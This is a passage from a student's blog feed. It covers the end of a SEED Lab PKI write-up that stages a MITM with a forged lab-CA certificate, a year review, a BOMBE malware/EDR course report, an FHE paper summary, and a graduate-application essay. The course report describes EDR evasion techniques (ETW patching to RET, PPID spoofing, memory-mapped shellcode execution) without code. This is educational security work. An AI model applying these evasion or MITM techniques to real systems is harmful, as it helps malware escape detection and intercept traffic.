ntnu.crt\n[02/14/25]seed@VM:~/.../SEEDLAB-PKI$ openssl req -newkey rsa:2048 -sha256 -keyout ntnu.key -out ntnu.csr -subj \u0026#34;/CN=www.csie.ntnu.edu.tw/O=NTNU CSIE/C=TW\u0026#34; -passout pass:dees Generating a RSA private key ..........................................................................................+++++ .............................................................................................................................................................................+++++ writing new private key to \u0026#39;ntnu.key\u0026#39; ----- [02/14/25]seed@VM:~/.../SEEDLAB-PKI$ openssl ca -config myCA_openssl.cnf -policy policy_anything -md sha256 -days 3650 -in ntnu.csr -out ntnu.crt -batch -cert ca.crt -keyfile ca.key Using configuration from myCA_openssl.cnf Enter pass phrase for ca.key: Check that the request matches the signature Signature ok Certificate Details: Serial Number: 4097 (0x1001) Validity Not Before: Feb 14 15:08:24 2025 GMT Not After : Feb 12 15:08:24 2035 GMT Subject: countryName = TW organizationName = NTNU CSIE commonName = www.csie.ntnu.edu.tw X509v3 extensions: X509v3 Basic Constraints: CA:FALSE Netscape Comment: OpenSSL Generated Certificate X509v3 Subject Key Identifier: 53:48:8B:B3:ED:7F:8C:1E:19:7C:FA:84:F7:05:BC:59:69:6E:3F:51 X509v3 Authority Key Identifier: keyid:D6:9E:DC:28:B8:0B:6E:67:00:F1:F3:C2:83:AC:7C:66:89:AC:D4:FF Certificate is to be certified until Feb 12 15:08:24 2035 GMT (3650 days) Write out database with 1 new entries Data Base Updated 接著修改 container 設定，Dockerfile 設定如下\nFROM handsonsecurity/seed-server:apache-php ARG WWWDIR=/var/www/bank32 COPY ./index.html ./index_red.html $WWWDIR/ COPY ./bank32_apache_ssl.conf /etc/apache2/sites-available COPY ./ntnu_apache_ssl.conf /etc/apache2/sites-available COPY ./certs/server.crt ./certs/server.key /certs/ COPY ./certs/ntnu.crt ./certs/ntnu.key /certs/ RUN chmod 400 /certs/server.key \\ \u0026amp;\u0026amp; chmod 400 /certs/ntnu.key \\ \u0026amp;\u0026amp; chmod 644 $WWWDIR/index.html \\ \u0026amp;\u0026amp; chmod 644 $WWWDIR/index_red.html \\ \u0026amp;\u0026amp; a2enmod ssl \\ \u0026amp;\u0026amp; a2ensite bank32_apache_ssl \\ \u0026amp;\u0026amp; a2ensite ntnu_apache_ssl CMD tail -f /dev/null apache server 也要新增 https://www.csie.ntnu.edu.tw [02/14/25]seed@VM:~/.../image_www$ cp bank32_apache_ssl.conf ntnu_apache_ssl.conf [02/14/25]seed@VM:~/.../image_www$ vim ntnu_apache_ssl.conf ntnu_apache_ssl.conf 設定如下\n\u0026lt;VirtualHost *:443\u0026gt; DocumentRoot /var/www/bank32 ServerName www.csie.ntnu.edu.tw DirectoryIndex index.html SSLEngine On SSLCertificateFile /certs/ntnu.crt SSLCertificateKeyFile /certs/ntnu.key \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /var/www/bank32 ServerName www.csie.ntnu.edu.tw DirectoryIndex index_red.html \u0026lt;/VirtualHost\u0026gt; # Set the following gloal entry to suppress an annoying warning message ServerName localhost 一樣根據 Dockerfile 的設定，將 ntnu.crt、ntnu.key 複製到 image_www/certs 中\n[02/14/25]seed@VM:~/.../SEEDLAB-PKI$ cp ntnu.crt ntnu.key ./image_www/certs/ 最後 dcbuild 建置 container，dcup 啟動\n[02/14/25]seed@VM:~/.../SEEDLAB-PKI$ dcbuild Building web-server Step 1/9 : FROM handsonsecurity/seed-server:apache-php ---\u0026gt; 2365d0ed3ad9 Step 2/9 : ARG WWWDIR=/var/www/bank32 ---\u0026gt; Using cache ---\u0026gt; 16a0763ac43d Step 3/9 : COPY ./index.html ./index_red.html $WWWDIR/ ---\u0026gt; Using cache ---\u0026gt; 718a24968c38 Step 4/9 : COPY ./bank32_apache_ssl.conf /etc/apache2/sites-available ---\u0026gt; Using cache ---\u0026gt; 844a04cc06cf Step 5/9 : COPY ./ntnu_apache_ssl.conf /etc/apache2/sites-available ---\u0026gt; 4f12dd172ab3 Step 6/9 : COPY ./certs/server.crt ./certs/server.key /certs/ ---\u0026gt; 72f13efc4133 Step 7/9 : COPY ./certs/ntnu.crt ./certs/ntnu.key /certs/ ---\u0026gt; cff8cc3d7e59 Step 8/9 : RUN chmod 400 /certs/server.key \u0026amp;\u0026amp; chmod 400 /certs/ntnu.key \u0026amp;\u0026amp; chmod 644 $WWWDIR/index.html \u0026amp;\u0026amp; chmod 644 $WWWDIR/index_red.html \u0026amp;\u0026amp; a2ensite bank32_apache_ssl \u0026amp;\u0026amp; a2ensite ntnu_apache_ssl ---\u0026gt; Running in baafc9959d27 Enabling site bank32_apache_ssl. To activate the new configuration, you need to run: service apache2 reload Enabling site ntnu_apache_ssl. To activate the new configuration, you need to run: service apache2 reload Removing intermediate container baafc9959d27 ---\u0026gt; b781c9decb84 Step 9/9 : CMD tail -f /dev/null ---\u0026gt; Running in afe500be0d41 Removing intermediate container afe500be0d41 ---\u0026gt; a79c3a37a3b6 Successfully built a79c3a37a3b6 Successfully tagged seed-image-www-pki:latest [02/14/25]seed@VM:~/.../SEEDLAB-PKI$ dcup -d Creating network \u0026#34;net-10.9.0.0\u0026#34; with the default driver Creating www-10.9.0.80 ... done docksh \u0026lt;id\u0026gt; 連進 container 後，使用指令 service apache2 start 啟用 apache 服務\n[02/14/25]seed@VM:~/.../SEEDLAB-PKI$ dockps 5b31c4d5ea6f www-10.9.0.80 [02/14/25]seed@VM:~/.../SEEDLAB-PKI$ docksh 5b root@5b31c4d5ea6f:/# service apache2 start * Starting Apache httpd web server apache2 Enter passphrase for SSL/TLS keys for www.csie.ntnu.edu.tw:443 (RSA): * root@5b31c4d5ea6f:/# 重新瀏覽 https://www.csie.ntnu.edu.tw ，發現成功顯示 Hello World 頁面，表示 MITM 攻擊成功 ","date":"2025-02-15","externalUrl":null,"permalink":"/posts/seedlab-pki/","section":"Blog Posts","summary":"","title":"Seed Lab PKI Writeup","type":"posts"},{"content":"按照慣例需要在年末回顧一下今年做了哪些事情，這次先用一張表格來呈現幾個我覺得比較重大的事情\n軌跡 # 月份 事蹟 Jan 19 我們。他們：是我覺得畢業後最靠近的時候了27 理想混蛋奇異點高雄場演唱會：文化幣帶我解鎖人生新成就 Feb 24 還騎台北：惹到中研院的水溝蓋翻了兩圈半 Mar 01 跟小師妹回中興02 台大就業博覽會：真豐富09 SITCON 2024：沒錯我終於敢參加了22 師大就業博覽會：這場其實是在逛無界塾的吧！ Apr 09 CPE12 HP 實習面試19 精誠 實習面試 May 01 客家社會探究活動：成為竹編 master 的必經之路02 奧義 實習面試06 專題論文送出21 台灣智園 實習面試23 叡揚 實習面試 Jun 01 慈濟畢業典禮 Jul 04 手機壞掉：從此手札多了消失的那三年05 找出最後的答案：結果發現是無解08 實習開始12 YOUNGSO 台北演奏會 Aug 13-14 Asia JCIS：可能是這輩子的學術巔峰25 送機：人生第一次到機場，不是為了搭飛機，Kenneth 我的第一次獻給你了 Sep 16 系上暑期企業實習成果分享會：在系上第一場 invited talk Oct 31 推甄 師大資工逕取 Nov 04 推甄 臺科資管逕取06 推甄 臺大電機正取：話說我以為是詐騙，誰叫他提早兩個禮拜破哽07 推甄 清大資安面試09-10 HITCON 菁英人才技術交流活動09 推甄 臺科資工面試13 推甄 交大資安正取：如果不是在公司我一定大叫18 推甄 臺科資工正取20 文山特教學校參訪21 理學院實習成果發表會：在理學院第一場 invited talk23 IPAS 初級資訊安全工程師考照26 推甄 交大報到 Dec 04 IPAS 初級資訊安全工程師證照 GET06 推甄 簽下碩班實驗室賣身契20 BOMBE 拿下 EDR 冠軍25 兵役體檢27 實習結束 感覺今年不會再長篇大論了\n從表格上可以看到滿明顯的分界，上半年一心就是在找實習，下半年就是一心在搞推甄，身為一名大學學生，似乎沒看到屬於他這個階段最應該做到的事情：好好讀書？\n3/1 國中老師是一語道破我現階段的問題，太貪心了，我的能力有限、時間有限，不可能說看到的所有東西都可以承接下來，雖然當初是勸說我趕快放掉教程專心在資工上面，但其實一路上這個問題都存在，就像年中為了實習、學業、教程和推甄的事情覺得自顧不暇卻又不知如何取捨，最後在躊躇之間才慌亂選擇，只能慶幸今年的運氣還不錯，讓我實習完成了、學業撐過去了，研究所也有一個好結果\n話說，下半年因為八月準備 conference 又兼顧實習的關係，忙到甚至找不到時間剪頭髮，就索性換一個髮型，也晉升長髮男的行列，缺點就是每天洗完澡花一堆時間吹頭髮、早上也要提早十分鐘處理它，一直唉沒時間的人卻又做出這麼浪費時間的決定 :) 如果有人知道男生長髮可以怎麼處理的麻煩找我交流一下\n感觸 # 大學生都在壓死線，今年我也壓了不少，連論文和推甄審查資料都可以這樣玩，學校課業不用期待我有多好的表現（這是自暴自棄的節奏）。以前的我不壓死線，在大學慢慢的會在死線前掙扎，趕在最後十秒鐘交出一份還可以看的成果，你以為上了大三大四會比較好嗎？並不會，大三開始學會看著死線從我旁邊經過，不管心中多大力的吶喊，外表也會故作鎮定的說「就讓它過去吧！」，嗯嗯沒錯我學會了視若無睹，只要成績還可以看我不會在意那一點點遲交，事後補交打個八折沒事啦！大四的我更厲害了，只要同一堂課幾個死線從旁邊飄過去就會跟這堂課說掰掰，原來退選才是解決問題的方法，沒想到這個道理到了大四才懂，這邊先跟下半年退選的課、放棄的事情說聲抱歉！然後年紀比我小的看到這篇文章不要亂學，我有本錢\n一樣是在後半年突然覺得「大家都在各自的道路上努力著」是一句很難過的話，以前覺得它很激勵，因為時間到了，本來每個人都會往各自的目標前往，自己也不例外，這句話表達的是大家都還在成長著，明明是一件好事；但多愁善感的我突然覺得這句話也表示「大家」都在漸行漸遠，走在同一條道路上的人在遇到叉路之後好像真的很難能再次走在一起\n新希望 # 做人不能貪心所以一樣給三個就好\n資安技術上還是要更精進 經過高等資安攻防的洗禮，拿到一大堆關鍵字，接下來的一年有很多東西可以好好消化，加上準備進入實驗室，應該又會是一次大躍進了 不要忘記在教育上的熱忱 雖然教育學程修不完，但不能忘記因為誤打誤撞進到師大而獲得的禮物，希望以後到研究所還有展現教育長才的地方 送自己永久性的畢業禮物 又是人生的轉銜階段，希望可以在畢業後到實驗室工作還沒完全下來前，學一個 喔對，我會順利畢業的，相信我！順便祝乖乖待在 C203 的考研小分隊趕快拿到好消息\n2024 謝謝你耶！這一年我玩得還算開心！\n","date":"2024-12-31","externalUrl":null,"permalink":"/posts/2024-review/","section":"Blog Posts","summary":"","title":"2024 年度回顧","type":"posts"},{"content":" 關於 BOMBE # 高等資安攻防這門課的期末專題採用 attack \u0026amp; defense 的方式進行，平台是一個稱為 BOMBE 的競賽，BOMBE 全名 Battle of Malware Bypass ans EDR，主辦方會給予特定環境的 VM，參賽者需要開發 Malware 偷取指定位置的 flag，或開發 EDR 偵測 Malware 的攻擊，這是奧義智慧科技在今年的 DEFCON (DEFCON 32) 舉辦的競賽，這次拉到師大的課堂上，透過五個 challenge (Malware * 3, EDR * 2) 以及參賽組別間相互競技作為本次課程期末專題\n專題差不多為期一個月左右，一個禮拜的時間寫基本 challenge、一個禮拜寫進階 challenge，一個禮拜進行最後開發，進行組別間的競賽，BOMBE 負責團隊甚至很用心地提供範例程式幫助我們著手專題，撰寫 document 說明環境建置、競賽規則以及學習資源，針對 Malware 和 EDR 都提供了不同技巧供我們做為入門\n這次跟兩個碩班學長組隊進行，雖然分工比較像是各自寫各自的程式，有問題再討論，但最後還是拿下 EDR 組第一名；Malware 組第四名！\nMalware 開發 # Malware 開發部分會針對嘗試的技術進行說明，雖然這部分剛好都沒成功\nETW Patch # 思路 # Challenge File Access Monitor 提到 EDR 會開 ETW 去監測 malware 的行為，要避免 ETW 的偵測其中一個做法是 ETW Patch，ETW 會透過 EtwEventWrite 在事件建立時寫入，過程中進行偵測，而 malware 可以透過修改 EtwEventWrite，阻止事件被寫入，進而讓 ETW 偵測不到。我們透過將 ETWEventWrite 第一個 instruction 改為 RET，在進入 ETWEventWrite 後就直接離開，避開原先 ETWEventWrite 會做的事情\n實作 # 344 行透過目前的 process 取得 process handle、355 行取得 ntdll.dll 位址，呼叫 PatchETW 進行後續任務 333 行會透過 GetEtwEventWriteOffset 尋找 EtwEventWrite 的位址，即尋找與 ntdll.dll 的 base address 差距 (offset)，並透過 ModifyRemoteMemory 將 EtwEventWrite 的第一個 byte 改成 0xC3，即 EtwEventWrite 第一個 instruction 為 RET 接下來要了解 PatchETW 中呼叫的自製兩個函式，一個是 GetEtwEventWriteOffset，一個是 ModifyRemoteMemory GetEtwEventWriteOffset 會尋找 EtwEventWrite 與 ntdll.dll base address 的差距，函式中有兩個變數，一個是 localNtdllAddress，另一個是 localNtdllBaseAddress，兩個相減即為 EtwEventWrite 與 ntdll.dll base address 的差距 其中 localNtdllAddress 會透過 GetLibraryAddress 取得 ntdll.dll 中 EtwEventWrite 的位址 另一個是 localNtdllBaseAddress，它會透過 GetRemoteNtdllBaseAddress 從當前 process 中尋找 ntdll.dll module 的 base address， ModifyRemoteMemory 函式會修改 EtwEventWrite 的第一個 instruction。311 行會將 virtual protect 打開，316 行會嘗試更改目標 byte 結果 # 未成功，仍可從 process explorer 查看到 malware 程序。 PPID Spoofing # 思路 # 這部分並不是為了 challenge 而設計，只是純粹 ETW Patch 寫不出來想要讓 malware 新增一些 feature 而進行的嘗試。PPID Spoofing 目標是把 malware 的 parent process 改掉，如果 EDR 有透過 parent process 辨別 malware，就有機會透過這種策略規避。\n實作 # Parent process 的資訊會存在 process thread attribute list 中，這次做法主要是透過 InitializaProcThreadAttributeList 初始化創建一個經設計的 process thread attribute list，再透過 UpdateProcThreadAttributeList 更改 process 的 thread attribute list，達到更換 parent process 的效果。其中 311 行第一次呼叫 InitializeProcThreadAttributeList 的原因是需要得到 lpSize，真正執行初始化為 314 行第二次呼叫 InitializeProcThreadAttributeList\n結果 # 未成功，卡在 CreateProcess 遇到讀取不可讀的記憶體位置。 Memory Mapping # 這部分是兩位學長的嘗試\n思路 # 在編寫 malware 時，由於不清楚 EDR 的運作內容，所以在編寫程式時，假設 EDR 是以監控特定的 SYSCALL 以及特定路徑檔案的存取操作。嘗試 Memory Mapping 的方法，使用 shellcode 將檔案內容載入到記憶體中，避免掉 EDR 可能監控的 SYSCALL\n實作 # 建立一個名為 MalwareMomory 記憶體映射檔案，使用 ViewAccessor shellcode 寫入到記憶體映射的位置，搭配 VirtualAlloc 將虛擬記憶體空間進行分配， CreateThread 建立 thread 執行 shellcode。\n結果 # 未成功，在 VirtualAlloc 時遇問題，並在上傳後仍會被偵測。\nEDR 開發 # EDR 的 challenge 中進階提剛好有寫出來，所以會針對解題策略與作法進行說明\nBypass File Access Monitor # 題目 # Bypass File Access Monitor 說到 malware 會產生一支子程序 cmd.exe，讓 cmd.exe 去複製目標檔案到其他地方，再去讀取內容，並把答案回傳\n思路 # 偵測 cmd.exe 這支程序，一旦被建立起來，就去檢查他的行為是否包含複製，且複製目標檔案是否為 challenge 的目標檔案，如果是則猜測其 parent process 為 malware，找出 parent process name 並回傳\n實作 # processStartedHandler 會在所有 process 開始執行時被 ETW 偵測到，因為我需要偵測 cmd.exe 這支 process，所以在這個函式中新增了第 91 至 113 行的程式碼，93 行檢查如果這支 process 名字是 cmd.exe，那就需要進行更進一步的判斷，如果做的事情包含複製 (args.Contains(“copy”)) 且複製目標為 challenge 目標檔案，此處以 challenge2 為例 (args.Contain(“login.data”))，則猜測其為惡意程式，需注意的是如果直接回傳該 process 會抓到 cmd.exe，真正的 malware 應該是它的 parent process，所以最後回傳 parent process name 即可通過 challenge\n結果 # 成功\n心得 # 之前嘗試的資安競賽都是 Jeopardy 類型的 CTF，沒打過 attack \u0026amp; defense 或 KoH，這次的 BOMBE 算是我第一次有實際攻防的競賽。不同的點是 Jeopardy 可以直接享用一個完整的平台，但 attack \u0026amp; defense 需要事先準備一個環境，各種入侵手法也需要自己思考，比起 Jeopardy 更廣也更難實作，當然防禦層面也是 Jeopardy 比較少有機會玩到的，可以自己寫一個簡單的 EDR 偵測 malware，這次真的是一個很寶貴的經驗\n其實一開始是想好好打 malware，因為比起 EDR 要猜測 malware 如何攻擊，malware 的目標很明確就是去偷 flag 而已，加上自己沒什麼試過當壞人的角色，想趁這個機會好好寫一個 malware 出來，然後哪一天晚上傳一句「學長，我寫了一支 malware，你要試試嗎？」，但很可惜的是寫 malware 的過程一直卡關，有時候是程式不會動，有時候是偷不到資料，或是 malware 的一些機制啟動不了，反而是心血來潮一個早上寫 EDR 的 challenge，非常順利的第一次就過關，這算是過程中意想不到的事情\n這趟路途中也發現，當我寫好一支 malware 要進行測試其實是比較容易的，因為只要執行下去並觀察是否有依照預期行為動作即可，比如說 PPID Spoofing 的功能開發完，就跑下去執行並監控該 process 的 PPID 是不是有成功被我更改，但相對的當我寫好一支 EDR 想要檢測是否能抓到 malware，似乎還需要把 malware 開發出來才能測試，當然要測試 malware 是否會被 EDR 抓到也是一樣的概念，只是就功能的正確性而言，似乎對於開發 malware 的要求比較低。這是我在最後一週因為寫不出 malware 轉戰 EDR 的小心得，並於期末分享那天提出來，當天 NiNi 說如果要測 EDR 有沒有寫好，其實 malware 網路上找一大堆，因為之前為了訓練某些 detector，其實也有相對應資料集，不會怕找不到，EDR 的概念也一樣，我想逃過哪一家的 EDR，就直接買一台過來玩一玩就好，要測多少次都不是問題\n不過最重要的應該是認知到攻防是一體的概念，不會說我想當純的紅隊或純的藍隊，畢竟攻擊方要知道藍隊怎麼防禦才能進化它的武器；防禦方要知道紅隊怎麼攻擊才能布好防禦網\n","date":"2024-12-30","externalUrl":null,"permalink":"/posts/bombe/","section":"Blog Posts","summary":"","title":"113-1 高等資安攻防 期末專題 BOMBE","type":"posts"},{"content":" What is Fully Homomorphic Encryption? # Homomorphic encryption allows operations to be performed directly on encrypted data, so the results are the same as if the operations had been performed on the plaintext. Fully homomorphic encryption (FHE) extends this to allow operations of arbitrary depth and type.\nMotivation # Cloud computing allows users to overcome the limitations of local devices. Even if their hardware is not powerful enough, they can leverage cloud computing to process data via third parties and achieve the desired results. However, with the rise of cloud computing, security has become a critical issue.\nI will use the following simple scenario to explain the motivation step by step.\nAlice has a piece of data, say a is 3 and b is 5, that she needs to send to a third party, Bob, for processing. In a typical cloud computing, Alice sends the data to Bob, who processes it and returns the results 8 to Alice.\nHowever, Alice worries that if someone intercepts the data during transmission, it could be exposed, posing a significant risk. To address this, Alice encrypts the data before sending it to Bob. Bob then decrypts the data, processes it, re-encrypts the results, and sends them back to Alice. Alice decrypts it and gain the final result. This is a standard encryption process.\nBut Alice still feels that exposing the raw data to Bob is risky. She needs a way to process the data while it remains encrypted - here is where homomorphic encryption comes in.\nIt seems everything is now more secure with FHE. Unfortunately, we figure out a potential risk as the following consideration describes. What if Alice wants Bob to perform an addition operation, but Bob performs a multiplication operation instead? Alice has no way to verify that Bob has performed the correct operation or not.\nWhile FHE does help solve a significant security issue, there remains a potential loophole, how can we ensure that the third-party computation is exactly what the data owner intended? This is the core problem our research addresses. Let me summarize all requirement of this problem in three categories.\nWe need the whole process to be performed under encryption so that no one else can see the raw data between transmission. We need homomorphic encryption, or fully homomorphic encryption to prevent the third party from seeing raw data. We need an additional validation step to verify if the third party runs the operation as the data owner intends. Solution # FHEwEC involves five algorithms: Setup, Encrypt, Evaluate, Decrypt, and Validate. Unlike traditional FHE, we make several modifications at each step to enable the new validation mechanism in the final step. Overall, we achieve validation through data duplication and deconstruction.\nFirst is Setup. The Setup phase generates three keys: a public key for encryption, a private key for decryption, and an evaluation key for FHE operations.\nIn the Encryption phase, there are four steps: policy formulation, data duplication, data deconstruction, and finally, FHE encryption.\nThe policy formulation uses a bloom filter to generate a number or bit array, which informs the third party of the number of message blocks and which ones are necessary. For example, as the slide shows, the bloom filter might indicate that under addition, eight message blocks will be used, with only the first four relevant, while the remaining four are random noise.\nNext is data duplication. The data owner duplicates the original data into s+t copies, where s and t will be explained shortly. In the example, assume there is a data 8, and we duplicate it 4 times.\nIn the deconstruction step, the data duplications are deconstructed based on addition and multiplication operations. The number of duplications undergoes addition deconstruction is s, while the number of duplications undergoes multiplication deconstruction is t. Finally, the total number of message blocks is N. In the example, two copies are deconstructed using addition, and two using multiplication, with each deconstruction splitting the data into two parts.\nFor instance, 2 + 6, 3 + 5, 1 * 8, and 2 * 4 are all equals 8\nIn this example, s is the number of additions, which is 2, and t is the number of multiplications, also equals to 2, while the total number of message blocks, N, is 8.\nReferring back to policy formulation, the policy indicated that the first four message blocks should be used, which corresponds to 2, 6, 3, and 5. These blocks were indeed created through addition, aligning with our intention to perform addition on the data.\nFinally, all message blocks undergo FHE encryption, indicated by black background color in the slide.\nThe third algorithm, Evaluate, is used by the third party.\nThis algorithm has two steps, policy checking and fully homomorphic evaluation.\nDuring policy checking, the third party performs an AND operation on the policies of the two pieces of data, yielding the policy to be used for the upcoming operations. The AND operation is necessary because it identifies the data that both parties have agreed can be used. As the following picture shows, the first policy p1 is the same as the one we previously showed. For convenience, I set all bits of the second policy p2 into 1. After AND operation, the result policy indicates that there are totally 8 message blocks, where the first four will be used later.\nNext is homomorphic evaluation. The third party selects the relevant message blocks according to the policy and performs the corresponding operations, in this case, homomorphic addition. For example, suppose the first piece of data m1 is 8 and the second m2 is 20, so the expected result is 28. The second piece of data is deconstructed similarly to the first, with 17 + 3, 10 + 10, 4 * 5, and 10 * 2 are all equal to 20. It\u0026rsquo;s important to note that the operations here are homomorphic because the data is still encrypted.\nSince the policy says that the last four message blocks are unnecessary, so we’ll ignore those message blocks, as shown in gray background color in the picture. The encrypted result might look like this,\n2 + 17 = 19 6 + 3 = 9 3 + 10 = 13 5 + 10 = 15 The third party sends this data back to the data owner.\nThe fourth step is Decrypt. First, all data is restored to plaintext.\nNext is reconstruction. Since the data has been deconstructed, the result won\u0026rsquo;t be in its original form, so it must be reassembled. Reconstruction involves selecting one set of message blocks and performing the intended operation, in this case, addition. For instance, using the first returned set, 19 + 9 = 28, which matches our expectation.\nThe final step is Validate. Validation requires reconstructing all returned message blocks. If the reconstructed results are consistent, the data is considered trustworthy; otherwise, the result is in trouble. Consider this example: We also have a set with 13 and 15. Adding them gives us 28, consistent with the previous results, indicating that the data is trustworthy.\nNow I’ll go through another example, when evaluation under multiplication.\nIn policy formulation, I set the policy to the last four bit.\nThe rest of steps in Encrypt are the same as under addition, so I’ll skip them.\nEvaluate is similar as well, but the result policy goes to the last four bits.\nThe FHE evaluation is taken under multiplication with m1 equals to 8 and m2 equals to 20. So the expected result should be 8 times 20 equals to 160. The result after FHE evaluation is as follows.\n1 * 4 = 4 8 * 5 = 40 2 * 10 = 20 4 * 2 = 8 Again, we decrypt these results and reconstruct them. We use the first returned set 4 and 40 to gain the final result 160, which matches our expectations.\nValidate will take the other set into consideration. So we take the 20 and 8, multiply them together and gain the result, still equals to 160. Thus, now we can say the result is trustworthy.\nProperties # FHEwEC has four key properties: Correctness, Completeness, Soundness, and Security.\nCorrectness # Correctness means that the results obtained using FHEwEC are consistent with those obtained using traditional FHE. This was demonstrated in the earlier section and is formally proven in the paper. You may find that the core concept is due to the commutative law in mathematics.\nCompleteness # Completeness means that if the third party performs the expected operation correctly, the result will always pass the validation step. This is also demonstrated in the previous section.\nSoundness # Soundness means that if the third party performs an operation different from what the data owner intended, the result will not pass validation — or if it does, the probability is extremely low.\nLet’s see the first example we use in the previous section. Assume the data owner expect the third party to perform addition, and the third party runs multiplication. The third party will return result as\n2 * 17 = 34 6 * 3 = 18 3 * 10 = 30 5 * 10 = 50 When data owner conducts the validation, it figures out that 34 + 18 = 52, but 30 + 50 = 80, which is not consistent. So the result is not trustworthy. Security # Security means that the FHEwEC scheme is secure against chosen-plaintext attack. This is because the validation process occurs outside of the FHE operations, adding an extra layer without altering the core FHE encryption or computation, ensuring that its security aligns with that of FHE.\nPerformance # We conduct two experiments, one for testing the execution time with respect to the total number of message blocks N while the other for testing the number of duplication under addition s and multiplication t.\nIn both experiments, we conclude that when N increases, the execution time also increases. Additionally, the encryption time occupies the most. Most importantly, both experiments indicates that the total execution time of whole scheme is less than one second, which means that we can efficiently apply FHEwEC but solve the problem we mentioned previously.\nAgain, you can view the details in the full paper.\nOur Contribution # We identified that even in an environment secured by fully homomorphic encryption, there are still potential risks when delegating computation to a third party. To address this, we proposed the FHEwEC scheme and successfully implemented it.\nFuture Works # Evaluation Type In FHEwEC, only ring operations are supported. However, true fully homomorphic encryption should support any operations it can performs. Therefore, our first goal is to generalize this scheme to support all operations supported by FHE. Evaluation Depth Additionally, FHEwEC does not support the multi-hop feature, meaning it cannot handle operations with a depth greater than one, significantly limiting its applicability. That is also the reason that the execution time of FHEwEC is so fast. Illegal Reason Finally, while this scheme can identify issues in third-party computation, it cannot guarantee the reason leads to this is really the third party. This is because pollution may occur between transmission. After pollution, the data must not pass the Validate algorithm and thus consider the result as not trustworthy. Comments # This work was authored by Kuan-Phing Wang and Bo-Yu Chen, under the supervision of professors Po-Wen Chi and Chao Wang.\nThe study has been published in 2024 Asia Joint Conference on Information Security (Asia JCIS) and gained best paper awards. It also has passed the 113 College Student Research Scholarship National Science Committee.\n","date":"2024-12-23","externalUrl":null,"permalink":"/posts/fhewec/","section":"Blog Posts","summary":"","title":"A Study of Fully Homomorphic Encryption with Evaluation Control","type":"posts"},{"content":"這是一場鬧劇，從 2024 五月開始，一路到約同年 11 月底才結束\n舉足不前 # 會說鬧劇是因為差不多五月那時候，就在猶豫推甄、考研和延畢三條路，想推甄是因為不想讓求學生涯全都是靠考試上去，因為升大學時從繁星玩到個申玩到指考，連研究所也考試就真的很像一個考試機器，或多或少還是想證明自己不是只有會讀書會考試（雖然到大學不是這麼一回事）而已，但說到底自己的經驗不怎麼漂亮，也不知道能推到多好的地方；想考研不外乎是因為這是條熟悉又保險的路，而且無論前面狀況如何，它是一條可以翻身的機會，算是最保險的路；想延畢是因為教育學程在這兩年對我而言真的很重要，有機會去嘗試教育也會想在最後拿到一些證明，但教程修完還需要十幾學分，也需要另外生十幾學分的自由學分出來，一年之內真的沒辦法做到，想要全拿勢必得延一年畢業，但不敢做這個決定的原因是不知道這一年會有什麼變化，說不定一年之後目標都變了，做這個選擇的動機、初衷也蕩然無存\n因為這樣，這個問題卡了我兩個多月，中間找了一些人問想法，但自己也知道問在多人也沒用，因為我是一個很固執的人，再多人的分析考量有八成是聽不進去的，頂多有一些面相我沒想過會加進來想一想，就像三年前搞到繁星、個申都失利，讓身邊不知道多少人唸很久，甚至到現在還在唸（雖然我沒有後悔過）。\n想問其他人的意見充其量是尋求認同而已\n我想要什麼？我想要修完教程，延畢一年，再前往研究所，但我不敢，不是因為晚一年升學的壓力，而是不知道 20 年後回頭看這一起事件，會不會覺得為了一個之後可能不會走上的教育路拚教程是很愚蠢的事情；不知道一年過後對資安熱忱是不是還這麼強烈，還是被賽棍蹂躪到想貴出這個圈子；不知道對研究所的需求是不是這麼強烈，還是就不升學了。其實還有一個潛藏的問題是，因為我有延畢這條路，無論最終我選擇推甄或是考研，都會有一個「沒關係，我還有延畢這條路」的想法，便不會全力以赴\n給自己定的期限是 7/8，開始實習的第一天，我認為實習前應該做出決定，然後對這個決定做出下半年的規劃，當時的決定是考研，雖然身兼課業、實習還要顧及考試是艱難的任務，但還是想讓自己體驗一下極限，看看能不能因為這半年的努力翻上自己的目標學校，沒想到的是實習加通勤幾乎耗掉了大半的時間，平日回到家都很晚，讀書只剩假日的時間，照這個進度準備下去時間根本不夠，而且光是一科線代就覺得自己懶得讀，更不用說如果讀到計算機結構或作業系統會怎麼辦，剛好九月中時柏叡找我討論推甄的事情，又約了 Neokent meeting，想著甚麼都不做就去 meeting 應該會被電，才開始準備自己的 SBOM，就這樣極晚才展開推甄這條路，當時是 9/21（對啊！這個時間點可以注意，表示這麼晚開始還是有機會的，只是這是壞榜樣不要學）\n簡單來說，一個應該延畢的人，選擇了考研這條路，但最終卻以推甄畫下句點\n引言太多了，趕快進入主題\n經歷 # 拿出來備戰的武器大概分成四個面向：修課經歷、學術專題、資安經歷和其他有利審查資料\n修課經歷 # GPA 3.83，系排名 9/50 (18%) 資訊安全攻防演練、資訊安全、高等資安攻防 修課成績上這個是必須，每間學校都會看這個面向，雖然我一直覺得都到申請研究所了，不希望跟之前升高中、升大學一樣還看在校成績，畢竟 GPA 這種東西沒辦法成為說服我一個人程度好壞的依據，但很可惜，現階段的臺灣還是把成績看得非常重，尤其最前段的學校\n說實話，這個成績讓我去競爭臺清交，我都認為不太可能，所以附上這部分資料時，自己都很心虛\n這邊可以分享一個故事，我申請的所有校系裡面，臺大交大實屬過分。臺大要求在歷年成績單上註明他們在意的科目成績，還要在另一個表單填寫那些科目的成績；交大除年平均成績，也要上報每年學期成績與排名，直接看出大一到大三的學習趨勢，並要求填寫「就資訊領域的科目中，表現最佳與最差的五個科目，並進行歷年修課狀況分析」，其實這個舉動可以看出很多申請者的細節，包含修課狀況、省思，想藏拙其實也很難\n至於修課經歷上，我就是點出資訊安全攻防演練、資訊安全以及高等資安攻防這三門課，稍微說明從這三門課學到什麼\n學術專題 # A Study of Fully Homomorphic Encryption with Evaluation Control 發表於 2024 Asia Joint Conference for Information Security，獲 Best Paper Awards 通過 114 年度國科會大專生研究計畫 最有利的是這個學術專題，碩班畢竟是做研究的地方，有一個好的學術專題其實會加很多分，尤其是大學生可以發表到國際會議、研討會上，優勢會更大。我比較幸運，跟平的專題有通過國科會計畫，又發表到國際研討會上，還拿了一個獎回來，對於書審這一塊，在很多學校應該都是會注意到的地方\n準備的過程有問過 Neokent 國科會計畫和參加國際會議的效力有多大，那時候得到的答案是國科會計畫普通，但有總比沒有好，原因是大學校的教授手邊計畫一堆，經費也比國科會高得多，所以不一定會看重國科會計畫；國際會議要看，像 Asia JCIS 